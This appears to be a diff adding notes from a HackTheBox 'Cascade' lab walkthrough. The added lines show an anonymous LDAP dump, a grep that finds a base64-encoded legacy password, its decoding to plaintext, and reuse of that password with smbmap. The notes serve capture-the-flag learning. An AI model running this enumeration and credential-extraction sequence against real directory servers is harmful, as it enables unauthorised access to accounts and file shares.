@@ -27,3 +27,21 @@ Host script results:
 |   date: 2021-06-18T15:05:37
 |_  start_date: 2021-06-17T20:34:56
 
+---------------------------------------------------
+Ldap search:
+
+└─# ldapsearch -x -h 10.10.10.182 -s sub -b 'DC=cascade,DC=local' > ldap
+└─# cat ldap | grep -i pwd -A 5 -B 5
+logonCount: 2
+sAMAccountName: r.thompson
+--
+cascadeLegacyPwd: clk0bjVldmE=
+└─# echo -n "clk0bjVldmE=" | base64 -d
+rY4n5eva
+
+└─# smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182
+
+
+References :
+https://blog.luckolen.xyz/posts/HTB/Cascade
+
